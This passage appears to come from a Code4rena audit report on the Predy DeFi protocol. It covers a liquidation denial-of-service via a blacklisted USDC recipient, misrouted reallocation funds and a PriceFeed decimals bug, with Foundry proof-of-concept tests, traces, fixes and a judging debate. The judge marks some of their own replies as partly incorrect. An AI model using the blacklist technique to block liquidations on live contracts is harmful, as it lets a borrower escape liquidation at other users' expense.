        //vault cannot be liquidated, inner error is "Blacklistable: account is blacklisted"
        vm.startPrank(liquidator);
        vm.expectRevert("TRANSFER_FAILED");
        _tradeMarket.execLiquidationCall(1, 1e18, _getSettlementData(Constants.Q96 * 11000 / 10000));
        vm.stopPrank();
    }
    ...
}
```

**`test/mocks/MockERC20.sol`**:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {ERC20} from "@solmate/src/tokens/ERC20.sol";

/**
 * @notice Mock of ERC20 contract
 */
contract MockERC20 is ERC20 {

    ...
    //@note adapted from Blacklistable.sol as used by USDC contract on arbitrum, 0xaf88d065e77c8cc2239327c5edb3a432268e5831
    modifier notBlacklisted(address _account) {
        require(_account != 0x0E6b8E34dC115a2848F585851AF23D99D09b8463, "Blacklistable: account is blacklisted");
        _;
    }

    function transfer(address to, uint256 amount) public override notBlacklisted(to) returns (bool) {
        return super.transfer(to, amount);
    }
}
```

In the repo's base directory, run the following command to execute the test. Observe that the output includes the `Blacklistable` error message:

```

    $ forge test --match-test test_audit_LiquidateBlacklist  -vvvv
    [⠢] Compiling...
    No files changed, compilation skipped

    Running 1 test for test/pool/ExecLiquidationCall.t.sol:TestExecLiquidationCall
    [PASS] test_audit_LiquidateBlacklist() (gas: 1159010)
    Traces:
      [1159010] TestExecLiquidationCall::test_audit_LiquidateBlacklist()
      ...
        │   │   │   ├─ [534] MockERC20::transfer(0x0E6b8E34dC115a2848F585851AF23D99D09b8463, 59999247 [5.999e7])
        │   │   │   │   └─ ← revert: Blacklistable: account is blacklisted
        │   │   │   └─ ← 0x08c379a00000...
        │   │   └─ ← revert: TRANSFER_FAILED
        │   └─ ← revert: TRANSFER_FAILED
        ├─ [0] VM::stopPrank()
        │   └─ ← ()
        └─ ← ()

    Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.71ms
```

### Tools Used

Foundry, VS Code

### Recommended Mitigation Steps

Blacklisted addresses can be checked against supporting quote tokens before they are set to `vault.recipient` in `PredyPool.updateRecepient`. In the case of USDC, this would involve calling the USDC contract's `isBlacklisted` method for supplied addresses. Ensure that this does introduce any callback/reentrancy issues by also making `PredyPool.updateRecepient` nonreentrant.
- A similar check can be done prior to the `safeTransfer` on line 97 in `LiquidationLogic.liquidate`.

To prevent abuse of this issue via frontrunning, require that a vault's position is healthy in `PredyPool.updateRecepient` before `vault.recipient` can be changed, so long as this does not interfere with any calls to `PredyPool.updateRecepient` made by existing market contracts.

### Assessed type

Token-Transfer

**[0xsomeone (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-05-predy-findings/issues/42#issuecomment-2197299337):**
 > The submission and its duplicates describe a way that can prevent a user's position from being liquidated by setting a receiver that has been blacklisted in one of the tokens officially supported by the system per the audit's `README`.
> 
> This vulnerability is significant, as it would prevent any liquidation that results in a positive margin from being carried out given that a user can change the vault's recipient at will to a blacklisted user. I believe a medium-risk rating is appropriate given that the Denial-of-Service is impermanent and liquidations can be performed at a zero or negative margin; however, I believe it is an interesting vulnerability that properly applies to the tokens officially supported in the system.
> 
> To note, any submission that does not identify the way liquidations are affected will be penalized by 25% (i.e., rewarded 75%).

**[syuhei176 (Predy) confirmed](https://github.com/code-423n4/2024-05-predy-findings/issues/42#event-13388149858)**
***

## [[M-07] Reallocation incorrectly sends the exceed `quoteTokens` to Market contract instead of reallocator](https://github.com/code-423n4/2024-05-predy-findings/issues/26)
*Submitted by [pkqs90](https://github.com/code-423n4/2024-05-predy-findings/issues/26)*

Loss of funds (`quoteToken`) for reallocator if the swapped `quoteTokens` exceeds requirement during reallocation.

### Bug Description

See the reallocation flowchart [here](https://docs.predy.finance/predy-v6/dev/architecture/flowchart#reallocate).

The reallocator would call a Market contract, which triggers the reallocation logic in PredyPool. Then tokens would then be swapped accordingly using the `SettlementCallbackLib`.

For `baseToken`, there is a check that the diff in `baseToken` (before/after the swap) must be equal to what is required for reallocation. For `quoteToken`, if the swap generates more `quoteToken` than what is required (e.g. the `exceedsQuote > 0` case in the following code), the `quoteTokens` should be transferred back to the initial reallocator, since it was the reallocator who was performing the swap.

However, the `quoteTokens` are transferred back to `msg.sender`, which is the Market contract, and would cause a loss of funds for the reallocator.

```solidity
    function reallocate(GlobalDataLibrary.GlobalData storage globalData, uint256 pairId, bytes memory settlementData)
        external
        returns (bool isRangeChanged)
    {
        ...
        {
            int256 deltaPositionBase;
            int256 deltaPositionQuote;

            (relocationOccurred, isRangeChanged, deltaPositionBase, deltaPositionQuote) =
                Perp.reallocate(pairStatus, pairStatus.sqrtAssetStatus);

            if (deltaPositionBase != 0) {
                globalData.initializeLock(pairId);

                globalData.callSettlementCallback(settlementData, deltaPositionBase);

                (int256 settledQuoteAmount, int256 settledBaseAmount) = globalData.finalizeLock();

                int256 exceedsQuote = settledQuoteAmount + deltaPositionQuote;

                if (exceedsQuote < 0) {
                    revert IPredyPool.QuoteTokenNotSettled();
                }

                if (settledBaseAmount + deltaPositionBase != 0) {
                    revert IPredyPool.BaseTokenNotSettled();
                }

                if (exceedsQuote > 0) {
>                   ERC20(pairStatus.quotePool.token).safeTransfer(msg.sender, uint256(exceedsQuote));
                }
            }
            ...
        }
        ...
    }
```

### Recommended Mitigation Steps

Send the tokens to the reallocator.

### Assessed type

Token-Transfer

**[0xsomeone (judge) decreased severity to Low and commented](https://github.com/code-423n4/2024-05-predy-findings/issues/26#issuecomment-2197671164):**
 > The reallocation function is indeed invoked by the `BaseMarket` and such an execution path would result in funds being incorrectly sent to the Market instead of the reallocators directly. Given that reallocations can occur directly, I believe that this is better suited as a QA (Low) risk as it arises under very specific circumstances and can be circumvented. Some markets also appear to be using balance of measurements and thus are more than likely to automatically "consume" those funds instead of having them remain locked. I will invite the Sponsor to visit this submission nonetheless.

**[pkqs90 (warden) commented](https://github.com/code-423n4/2024-05-predy-findings/issues/26#issuecomment-2197872306):**
 > @0xsomeone - maybe I'm missing something important here, but to my current understanding, the reallocation function *must* be called to change the range for squart, and this does not happen directly during regular trade/swaps.
> 
> Also, the funds sent to the Market would be unretrievable since there is no function to do so. That's why I placed it with a high severity issue.

**[syuhei176 (Predy) confirmed](https://github.com/code-423n4/2024-05-predy-findings/issues/26#event-13342002894)**

**[0xsomeone (judge) increased severity to Medium and commented](https://github.com/code-423n4/2024-05-predy-findings/issues/26#issuecomment-2208386935):**
 > This report lacked Sponsor input due to being invalidated during the validation round. I explicitly requested the Sponsor to provide input to this and several other exhibits so as to provide a fine-tuned judgment, and my earlier judgment was based on validation.
> 
> @pkqs90 - I agree with what you shared; however, I believe a medium-risk rating is better appropriate as the fund loss involved in this exhibit versus [#27](https://github.com/code-423n4/2024-05-predy-findings/issues/27) is significantly lower and arises under specific conditions.

***

## [[M-08] PriceFeed does not return to the correct price for quote pairs](https://github.com/code-423n4/2024-05-predy-findings/issues/22)
*Submitted by [gumgumzum](https://github.com/code-423n4/2024-05-predy-findings/issues/22)*

<https://github.com/code-423n4/2024-05-predy/blob/main/src/PriceFeed.sol#L29-L59><br><https://github.com/code-423n4/2024-05-predy/blob/main/src/libraries/PositionCalculator.sol#L141-L149><br><https://github.com/code-423n4/2024-05-predy/blob/main/src/libraries/PositionCalculator.sol#L83><br><https://github.com/code-423n4/2024-05-predy/blob/main/src/libraries/PositionCalculator.sol#L70><br><https://github.com/code-423n4/2024-05-predy/blob/main/src/libraries/PositionCalculator.sol#L41><br><https://github.com/code-423n4/2024-05-predy/blob/main/src/libraries/PositionCalculator.sol#L56><br><https://github.com/code-423n4/2024-05-predy/blob/main/src/markets/perp/PerpMarketV1.sol#L227><br><https://github.com/code-423n4/2024-05-predy/blob/main/src/markets/perp/PerpMarketV1.sol#L114-L115><br><https://github.com/code-423n4/2024-05-predy/blob/main/src/markets/gamma/GammaTradeMarket.sol#L237><br><https://github.com/code-423n4/2024-05-predy/blob/main/src/markets/gamma/GammaTradeMarket.sol#L286><br><https://github.com/code-423n4/2024-05-predy/blob/main/src/markets/gamma/GammaTradeMarket.sol#L346><br><https://github.com/code-423n4/2024-05-predy/blob/main/src/PredyPool.sol#L352-L354><br><https://github.com/code-423n4/2024-05-predy/blob/main/src/libraries/logic/TradeLogic.sol#L55-L56><br><https://github.com/code-423n4/2024-05-predy/blob/main/src/libraries/logic/TradeLogic.sol#L47-L48><br><https://github.com/code-423n4/2024-05-predy/blob/main/src/libraries/logic/ReaderLogic.sol#L35-L36><br><https://github.com/code-423n4/2024-05-predy/blob/main/src/libraries/logic/LiquidationLogic.sol#L75-L76><br><https://github.com/code-423n4/2024-05-predy/blob/main/src/libraries/logic/LiquidationLogic.sol#L141-L142>

### Impact

Discrepancy in [PositionCalculator@getSqrtIndexPrice](https://github.com/code-423n4/2024-05-predy/blob/main/src/libraries/PositionCalculator.sol#L141-L149) (cascading down the line to anywhere it is used) when using a [`PriceFeed`](https://github.com/code-423n4/2024-05-predy/blob/main/src/PriceFeed.sol#L29) or not.

This makes parts of the system unusable for quote pairs (e.g., when selling, position is not safe in `PerpMarket` since the vault value ends up being very low and the vault margin being negative) and may lead to other problems if at first a `PriceFeed` is not used but then is updated later since the computed state will change after the update.

### Root Cause

```solidity
contract PriceFeed {
    address private immutable _quotePriceFeed;
    address private immutable _pyth;
    uint256 private immutable _decimalsDiff; // <==== Audit
    bytes32 private immutable _priceId;

    uint256 private constant VALID_TIME_PERIOD = 5 * 60;

    constructor(address quotePrice, address pyth, bytes32 priceId, uint256 decimalsDiff) { // <==== Audit
        _quotePriceFeed = quotePrice;
        _pyth = pyth;
        _priceId = priceId;
        _decimalsDiff = decimalsDiff; // <==== Audit
    }

    /// @notice This function returns the square root of the baseToken price quoted in quoteToken.
    function getSqrtPrice() external view returns (uint256 sqrtPrice) {
        (, int256 quoteAnswer,,,) = AggregatorV3Interface(_quotePriceFeed).latestRoundData();

        IPyth.Price memory basePrice = IPyth(_pyth).getPriceNoOlderThan(_priceId, VALID_TIME_PERIOD);

        require(basePrice.expo == -8, "INVALID_EXP");

        require(quoteAnswer > 0 && basePrice.price > 0);

        uint256 price = uint256(int256(basePrice.price)) * Constants.Q96 / uint256(quoteAnswer);
        price = price * Constants.Q96 / _decimalsDiff; // <==== Audit

        sqrtPrice = FixedPointMathLib.sqrt(price);
    }
}
```

It's not possible to create a `PriceFeed` with a fraction as `decimalsDiff`.
For base pairs, it's not an issue, but for quote pairs it makes it impossible to get the correct price.

For example, for the `USDC/WETH`, the base pair `PriceFeed` would have a `1e12` `decimalsDiff` but the quote pair `PriceFeed` should have a `1e12` `decimalsDiff` which is not possible (the lower you can go is `1e0`).

### Test

<details>

```solidity
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {ERC20} from "@solmate/src/tokens/ERC20.sol";
import {IUniswapV3Factory} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Factory.sol";

import {AddPairLogic, PredyPool, Perp, IPredyPool} from "../../src/PredyPool.sol";
import {PriceFeed} from "../../src/PriceFeed.sol";
import {InterestRateModel} from "../../src/libraries/InterestRateModel.sol";

contract PriceFeedDiscrepancyTest is Test {
    PredyPool predyPool;

    uint128 internal constant RISK_RATIO = 109544511;
    uint128 internal constant BASE_MIN_COLLATERAL_WITH_DEBT = 2000;

    address admin = vm.addr(100);

    ERC20 USDC = ERC20(0xaf88d065e77c8cC2239327C5EDb3A432268e5831);
    ERC20 WETH = ERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);

    bytes32 USDC_PYTH_PRICE_ID =
        0xeaa020c61cc479712813461ce153894a96a6c00b21ed0cfc2798d1f9a9e9c94a;
    bytes32 WETH_PYTH_PRICE_ID =
        0xff61491a931112ddf1bd8147cd1b641375f79f5825126d665480874634fd0ace;

    address USDC_CHAINLINK_PRICE_FEED =
        0x50834F3163758fcC1Df9973b6e91f0F0F0434aD3;
    address WETH_CHAINLINK_PRICE_FEED =
        0x639Fe6ab55C921f74e7fac1ee960C0B6293ba612;

    IUniswapV3Factory uniswapFactory =
        IUniswapV3Factory(0x1F98431c8aD98523631AE4a59f267346ea31F984);

    address pyth = 0xff1a0f4744e8582DF1aE09D5611b887B6a12925C;

    function setUp() public {
        vm.label(admin, "ADMIN");
        vm.label(address(USDC), "USDC");
        vm.label(address(WETH), "WETH");

        vm.createSelectFork(vm.envString("ALCHEMY_RPC_URL"));

        vm.startPrank(admin);
        predyPool = new PredyPool();
        predyPool.initialize(address(uniswapFactory));
    }

    function testSqrtIndexPrice() public {
        vm.startPrank(admin);
        PriceFeed quotePriceFeed = new PriceFeed(
            WETH_CHAINLINK_PRICE_FEED,
            pyth,
            USDC_PYTH_PRICE_ID,
            1e0
        );

        PriceFeed basePriceFeed = new PriceFeed(
            USDC_CHAINLINK_PRICE_FEED,
            pyth,
            WETH_PYTH_PRICE_ID,
            1e12
        );

        address pool = uniswapFactory.getPool(
            address(USDC),
            address(WETH),
            500
        );

        uint256 quotePair = registerPair(pool, address(WETH), address(0), true);
        uint256 basePair = registerPair(pool, address(USDC), address(0), true);

        uint256 quoteIndexPriceBefore = predyPool.getSqrtIndexPrice(quotePair);
        uint256 baseIndexPriceBefore = predyPool.getSqrtIndexPrice(basePair);

        predyPool.updatePriceOracle(quotePair, address(quotePriceFeed));
        predyPool.updatePriceOracle(basePair, address(basePriceFeed));

        assertApproxEqRel(
            baseIndexPriceBefore,
            predyPool.getSqrtIndexPrice(basePair),
            1e16
        );
        assertApproxEqRel(
            quoteIndexPriceBefore,
            predyPool.getSqrtIndexPrice(quotePair),
            1e16
        );
    }

    function registerPair(
        address pool,
        address quoteToken,
        address priceFeed,
        bool isWhitelistEnabled
    ) internal returns (uint256) {
        InterestRateModel.IRMParams memory irmParams = InterestRateModel
            .IRMParams(1e16, 9 * 1e17, 5 * 1e17, 1e18);

        return
            predyPool.registerPair(
                AddPairLogic.AddPairParams(
                    quoteToken,
                    admin,
                    pool,
                    priceFeed,
                    isWhitelistEnabled,
                    0,
                    Perp.AssetRiskParams(
                        RISK_RATIO,
                        BASE_MIN_COLLATERAL_WITH_DEBT,
                        1000,
                        500,
                        1005000,
                        1050000
                    ),
                    irmParams,
                    irmParams
                )
            );
    }
}
```

</details>

### Results

```console
❯ forge test --match-contract PriceFeedDiscrepancyTest -vv
[⠢] Compiling...
No files changed, compilation skipped

Ran 1 test for test/fork/PriceFeedDiscrepancy.t.sol:PriceFeedDiscrepancyTest
[FAIL. Reason: assertion failed] testSqrtIndexPrice() (gas: 4948278)
Logs:
  Error: a ~= b not satisfied [uint]
          Left: 1333136901050186247877690170972068
         Right: 1331884368549106242288122906
   Max % Delta: 1.000000000000000000
       % Delta: 100093942.135387808257073200

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 17.83ms (4.19ms CPU time)

Ran 1 test suite in 342.31ms (17.83ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/fork/PriceFeedDiscrepancy.t.sol:PriceFeedDiscrepancyTest
[FAIL. Reason: assertion failed] testSqrtIndexPrice() (gas: 4948278)

Encountered a total of 1 failing tests, 0 tests succeeded
```

### Recommended Mitigation Steps

```solidity
diff --git a/src/PriceFeed.sol b/src/PriceFeed.sol
index a8cd985..bd0152d 100644
--- a/src/PriceFeed.sol
+++ b/src/PriceFeed.sol
@@ -9,13 +9,13 @@ import {Constants} from "./libraries/Constants.sol";
 contract PriceFeedFactory {
     address private immutable _pyth;
 
-    event PriceFeedCreated(address quotePrice, bytes32 priceId, uint256 decimalsDiff, address priceFeed);
+    event PriceFeedCreated(address quotePrice, bytes32 priceId, int256 decimalsDiff, address priceFeed);
 
     constructor(address pyth) {
         _pyth = pyth;
     }
 
-    function createPriceFeed(address quotePrice, bytes32 priceId, uint256 decimalsDiff) external returns (address) {
+    function createPriceFeed(address quotePrice, bytes32 priceId, int256 decimalsDiff) external returns (address) {
         PriceFeed priceFeed = new PriceFeed(quotePrice, _pyth, priceId, decimalsDiff);
 
         emit PriceFeedCreated(quotePrice, priceId, decimalsDiff, address(priceFeed));
@@ -29,12 +29,12 @@ contract PriceFeedFactory {
 contract PriceFeed {
     address private immutable _quotePriceFeed;
     address private immutable _pyth;
-    uint256 private immutable _decimalsDiff;
+    int256 private immutable _decimalsDiff;
     bytes32 private immutable _priceId;
 
     uint256 private constant VALID_TIME_PERIOD = 5 * 60;
 
-    constructor(address quotePrice, address pyth, bytes32 priceId, uint256 decimalsDiff) {
+    constructor(address quotePrice, address pyth, bytes32 priceId, int256 decimalsDiff) {
         _quotePriceFeed = quotePrice;
         _pyth = pyth;
         _priceId = priceId;
@@ -52,7 +52,12 @@ contract PriceFeed {
         require(quoteAnswer > 0 && basePrice.price > 0);
 
         uint256 price = uint256(int256(basePrice.price)) * Constants.Q96 / uint256(quoteAnswer);
-        price = price * Constants.Q96 / _decimalsDiff;
+
+        if (_decimalsDiff > 0) {
+            price = price * Constants.Q96 / 10 ** uint256(_decimalsDiff);
+        } else {
+            price = price * Constants.Q96 * 10 ** uint256(-_decimalsDiff);
+        }
 
         sqrtPrice = FixedPointMathLib.sqrt(price);
     }
```

### Assessed type

Oracle

**[syuhei176 (Predy) disputed and commented](https://github.com/code-423n4/2024-05-predy-findings/issues/22#issuecomment-2174800974):**
 > I don't understand the issue you're pointing out. The `PriceFeed` represents the square root of the price of the `baseToken` in terms of the `quoteToken`, and it's not necessary to have separate prices for both the `baseToken` and the `quoteToken`.
> 
> As for the recommended mitigation steps, it's using (-`_decimalsDiff`) in the condition where `_decimalsDiff` is negative, and it seems doing the same thing for both conditions.

**[0xsomeone (judge) commented](https://github.com/code-423n4/2024-05-predy-findings/issues/22#issuecomment-2197313030):**
 > The Warden states that the price normalization step in the `PriceFeed` contract does not account for a "negative" decimal difference (i.e., requiring a multiplication instead of a division). 
> 
> I do not believe the described vulnerability holds true as the oracle can always be created in the "positive" decimal direction, and the square root encoded price can be decoded and utilized in the inverse direction. As such, a `PriceFeed` configured for the `WETH/USDC` direction can be used in the `USDC/WETH` direction without necessitating a different `PriceFeed` deployment.

**[gumgumzum (warden) commented](https://github.com/code-423n4/2024-05-predy-findings/issues/22#issuecomment-2198059151):**
 > @0xsomeone - That is unfortunately incorrect due to how `PositionCalculator@getSqrtIndexPrice` works:
> 
> ```solidity
>     function getSqrtIndexPrice(DataType.PairStatus memory pairStatus) internal view returns (uint256 sqrtPriceX96) {
>         if (pairStatus.priceFeed != address(0)) {
>             return PriceFeed(pairStatus.priceFeed).getSqrtPrice();
>         } else {
>             return UniHelper.convertSqrtPrice(
>                 UniHelper.getSqrtTWAP(pairStatus.sqrtAssetStatus.uniswapPool), pairStatus.isQuoteZero
>             );
>         }
>     }
> ```
>
> When using a `PriceFeed`, it directly returns the price returned from the `PriceFeed` regardless of whether the pair is a base or a quote pair. Otherwise, it uses the Uniswap Sqrt TWAP and converts it based on whether the pair is a base pair or a quote pair.
> 
> So it's not possible to use the same `PriceFeed` for both a base and quote pair otherwise [PositionCalculator@getSqrtIndexPrice](https://github.com/code-423n4/2024-05-predy/blob/main/src/libraries/PositionCalculator.sol#L141-L149) would return the same price for both pairs which is wrong.
> 
> Here is a modified POC that demonstrates that:
> 
> <details>
>
> ```solidity
> pragma solidity ^0.8.0;
> 
> import {Test} from "forge-std/Test.sol";
> import {ERC20} from "@solmate/src/tokens/ERC20.sol";
> import {IUniswapV3Factory} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Factory.sol";
> 
> import {AddPairLogic, PredyPool, Perp, IPredyPool} from "../../src/PredyPool.sol";
> import {PriceFeed} from "../../src/PriceFeed.sol";
> import {InterestRateModel} from "../../src/libraries/InterestRateModel.sol";
> 
> contract PriceFeedDiscrepancyTest is Test {
>     PredyPool predyPool;
> 
>     uint128 internal constant RISK_RATIO = 109544511;
>     uint128 internal constant BASE_MIN_COLLATERAL_WITH_DEBT = 2000;
> 
>     address admin = vm.addr(100);
> 
>     ERC20 USDC = ERC20(0xaf88d065e77c8cC2239327C5EDb3A432268e5831);
>     ERC20 WETH = ERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
> 
>     bytes32 USDC_PYTH_PRICE_ID =
>         0xeaa020c61cc479712813461ce153894a96a6c00b21ed0cfc2798d1f9a9e9c94a;
>     bytes32 WETH_PYTH_PRICE_ID =
>         0xff61491a931112ddf1bd8147cd1b641375f79f5825126d665480874634fd0ace;
> 
>     address USDC_CHAINLINK_PRICE_FEED =
>         0x50834F3163758fcC1Df9973b6e91f0F0F0434aD3;
>     address WETH_CHAINLINK_PRICE_FEED =
>         0x639Fe6ab55C921f74e7fac1ee960C0B6293ba612;
> 
>     IUniswapV3Factory uniswapFactory =
>         IUniswapV3Factory(0x1F98431c8aD98523631AE4a59f267346ea31F984);
> 
>     address pyth = 0xff1a0f4744e8582DF1aE09D5611b887B6a12925C;
> 
>     function setUp() public {
>         vm.label(admin, "ADMIN");
>         vm.label(address(USDC), "USDC");
>         vm.label(address(WETH), "WETH");
> 
>         vm.createSelectFork(vm.envString("ALCHEMY_RPC_URL"));
> 
>         vm.startPrank(admin);
>         predyPool = new PredyPool();
>         predyPool.initialize(address(uniswapFactory));
>     }
> 
>     function testSqrtIndexPrice() public {
>         vm.startPrank(admin);
> 
>         PriceFeed basePriceFeed = new PriceFeed(
>             USDC_CHAINLINK_PRICE_FEED,
>             pyth,
>             WETH_PYTH_PRICE_ID,
>             1e12
>         );
> 
>         address pool = uniswapFactory.getPool(
>             address(USDC),
>             address(WETH),
>             500
>         );
> 
>         uint256 quotePair = registerPair(pool, address(WETH), address(0), true);
>         uint256 basePair = registerPair(pool, address(USDC), address(0), true);
> 
>         uint256 quoteIndexPriceBefore = predyPool.getSqrtIndexPrice(quotePair);
>         uint256 baseIndexPriceBefore = predyPool.getSqrtIndexPrice(basePair);
> 
>         predyPool.updatePriceOracle(quotePair, address(basePriceFeed)); // <===== Modified this
>         predyPool.updatePriceOracle(basePair, address(basePriceFeed));
> 
>         assertApproxEqRel(
>             baseIndexPriceBefore,
>             predyPool.getSqrtIndexPrice(basePair),
>             1e16
>         );
>         assertApproxEqRel(
>             quoteIndexPriceBefore,
>             predyPool.getSqrtIndexPrice(quotePair),
>             1e16
>         );
>     }
> 
>     function registerPair(
>         address pool,
>         address quoteToken,
>         address priceFeed,
>         bool isWhitelistEnabled
>     ) internal returns (uint256) {
>         InterestRateModel.IRMParams memory irmParams = InterestRateModel
>             .IRMParams(1e16, 9 * 1e17, 5 * 1e17, 1e18);
> 
>         return
>             predyPool.registerPair(
>                 AddPairLogic.AddPairParams(
>                     quoteToken,
>                     admin,
>                     pool,
>                     priceFeed,
>                     isWhitelistEnabled,
>                     0,
>                     Perp.AssetRiskParams(
>                         RISK_RATIO,
>                         BASE_MIN_COLLATERAL_WITH_DEBT,
>                         1000,
>                         500,
>                         1005000,
>                         1050000
>                     ),
>                     irmParams,
>                     irmParams
>                 )
>             );
>     }
> }
> ```
> 
> </details>
>
> Its results: 
> 
> ```console
> ❯ forge test --match-contract PriceFeedDiscrepancyTest -vv
> [⠢] Compiling...
> No files changed, compilation skipped
> 
> Ran 1 test for test/fork/PriceFeedDiscrepancy.t.sol:PriceFeedDiscrepancyTest
> [FAIL. Reason: assertion failed] testSqrtIndexPrice() (gas: 4934707)
> Logs:
>   Error: a ~= b not satisfied [uint]
>           Left: 1361087074510534603633354914613524
>          Right: 4611728606150998419235085
>    Max % Delta: 1.000000000000000000
>        % Delta: 29513598612.100135584576446400
> 
> Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 15.36s (13.24s CPU time)
> 
> Ran 1 test suite in 15.38s (15.36s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)
> 
> Failing tests:
> Encountered 1 failing test in test/fork/PriceFeedDiscrepancy.t.sol:PriceFeedDiscrepancyTest
> [FAIL. Reason: assertion failed] testSqrtIndexPrice() (gas: 4934707)
> 
> Encountered a total of 1 failing tests, 0 tests succeeded
> ```

**[0xsomeone (judge) commented](https://github.com/code-423n4/2024-05-predy-findings/issues/22#issuecomment-2208444266):**
 > @gumgumzum, a `sqrtPriceX96` data point can be decoded in two directions, and you can see an example of that [here](https://github.com/Uniswap/v3-periphery/blob/v1.3.0/contracts/libraries/OracleLibrary.sol#L49-L69). The PoC provided does not adequately utilize the price measurement.

**[gumgumzum (warden) commented](https://github.com/code-423n4/2024-05-predy-findings/issues/22#issuecomment-2208625944):**
 > @0xsomeone - the PoC provided clearly shows that the price returned from [PredyPool@getSqrtIndexPrice](https://github.com/code-423n4/2024-05-predy/blob/main/src/PredyPool.sol#L352C14-L354) is wrong when using a `PriceFeed`. This functions calls [PositionCalculator@getSqrtIndexPrice](https://github.com/code-423n4/2024-05-predy/blob/main/src/libraries/PositionCalculator.sol#L141-L149) directly, which is **not converting** the price when using a `PriceFeed`.
> 
> The result `PredyPool@getSqrtIndexPrice` is used **directly without conversion** throughout the protocol, for example:
> [here](https://github.com/code-423n4/2024-05-predy/blob/main/src/markets/perp/PerpMarketV1.sol#L227) and [here](https://github.com/code-423n4/2024-05-predy/blob/main/src/markets/gamma/GammaTradeMarket.sol#L346).

**[0xsomeone (judge) commented](https://github.com/code-423n4/2024-05-predy-findings/issues/22#issuecomment-2212523209):**
 > EDIT 2: As a disclaimer, some contents of this reply are misconceived/incorrect and it should not be regarded as correct.
> 
> @gumgumzum, I do not see any problem with the instances utilized as they both treat the reported price as a square root price. The system will configure a particular pair in one direction (the direction with a positive decimal difference), and that is acceptable.
> 
> I will notify the Sponsor to have a second look at this submission but will retain my original invalidation ruling for now. If any further feedback is needed, it will be explicitly requested.
> 
> EDIT: After thoroughly revisiting, it appears the `_decimalDiff` was meant to accommodate for decimal differences in the oracles, not the tokens. The main problem here is that it can only be used as a divisor and the multiplicand of the overall price calculation is the Pyth oracle, meaning that if the Pyth oracle has fewer decimals than the Chainlink oracle a proper `PriceFeed` will not be configurable. 

**[syuhei176 (Predy) commented](https://github.com/code-423n4/2024-05-predy-findings/issues/22#issuecomment-2213785699):**
 > @gumgumzum - now I understand the issue presented in this report.
> 
> For example, when registering the BTC/DAI pair,
> - BTC has decimals = 8 and
> - DAI has decimals = 18,
> - So `decimalsDiff` should be `-10**10`.
> 
> However, the `PriceFeed` does not allow the registration of negative decimals. I believe this report is valid.

**[0xsomeone (judge) commented](https://github.com/code-423n4/2024-05-predy-findings/issues/22#issuecomment-2214203023):**
 > EDIT: As a disclaimer, some contents of this reply are misconceived/incorrect and it should not be regarded as correct.
> 
> @syuhei176 - I would like to make sure everyone is aligned in relation to this submission.
> 
> The problem with the current `PriceFeed` is **not** related to the decimals of the underlying tokens. It is related to the decimals of the oracle measurements.
> 
> A square root encoded Uniswap V3 price is expected to be in the following form:
> 
> Note: please see scenario in judge's [original comment](https://github.com/code-423n4/2024-05-predy-findings/issues/22#issuecomment-2214203023).
> 
> The final operation of the code in the `PriceFeed` is:
> 
> ```solidity
> sqrtPrice = FixedPointMathLib.sqrt(price);
> ```
> 
> We can raise both equations to the power of `2` to understand what `price` is meant to represent:
> 
> Note: please see scenario in judge's [original comment](https://github.com/code-423n4/2024-05-predy-findings/issues/22#issuecomment-2214203023).
> 
> The actual calculations of `price` should always yield the price of the asset extrapolated by `2^{96}` twice, and we have the following code to deduce this:
> 
> ```solidity
> uint256 price = uint256(int256(basePrice.price)) * Constants.Q96 / uint256(quoteAnswer);
> price = price * Constants.Q96 / _decimalsDiff;
> ```
> 
> As we can observe above, the code will deduce the price of the asset by dividing the Pyth Network price by the Chainlink price and multiplying that by `2^{96}` (`Constants.Q96`) twice on each multiplication and division operation to preserve accuracy.
> 
> In the above code segment, the `_decimalsDiff` variable is solely needed when the price measurements of the assets are reported in different decimal denominations. The `_decimalsDiff` variable presently supports only a positive decimal difference between the Pyth Network oracle and the Chainlink oracle (i.e., the Pyth Network oracle should always have a higher or equal accuracy when compared to the Chainlink oracle).
> 
> Based on the audit's scope, the assets that are meant to be supported are: 
> 
> | Question | Answer |
> | - | - |
> | ERC20 used by the protocol | WETH, USDC, ARB, USDT, DAI, WBTC |
> 
> All these assets share `USD` based oracle measurements (as the oracles need to have a common base), and all oracles support 8 decimals of accuracy. As such, the current code will work as expected with the current list of supported assets by configuring the `_decimalsDiff` to be `1` (i.e., a no-op).
> 
> While I fully understand the concerns the Warden raises, I do not believe the code presently manifests itself as a vulnerability based on the audit's description. In reality, **all EIP-20 assets can be utilized safely** as long as their Chainlink and Pyth Network oracles have `8` decimals which is true for all USD-denominated oracles.
> 
> What I do see is incorrect code, as the `_decimalsDiff` concept should not exist in the `PriceFeed` in the first place based on how the `PriceFeed` is meant to operate. We can incorporate the recommendations of the Warden into the codebase to ensure that the `PriceFeed` supports an arbitrary decimal difference between the oracle measurements, however, such a feature would not be used with the current configuration of the system and would never be utilized when using USD-based oracle measurements.
> 
> I invite the Warden to refute any of the points I have raised, and the Sponsor to re-evaluate the submission's validity in light of the above. 

**[syuhei176 (Predy) commented](https://github.com/code-423n4/2024-05-predy-findings/issues/22#issuecomment-2214243426):**
> The final output of the `PriceFeed`, `sqrtPriceX96`, follows the same concept as used in Uniswap. For example, in the case of BTC/DAI, if 1 BTC is `$60,000`, it would be calculated as follows: 
> 
> ```
> sqrtPriceX96 = (1 * 10**8) * (2**96) / 60000 * 10**18
> ```
> 
> Therefore, this also involves the issue of the underlying token's decimals.

**[0xsomeone (judge) commented](https://github.com/code-423n4/2024-05-predy-findings/issues/22#issuecomment-2214261792):**
 > The `sqrtPriceX96` can be decoded to an arbitrary precision as it represents a ratio between the tokens with 96 fixed point precision.
> 
> In the case of `BTC/DAI`, the present code would calculate that for every BTC we need 60.000 DAI. The question of decimals is reliant on the code that integrates with the square root encoded price.
> 
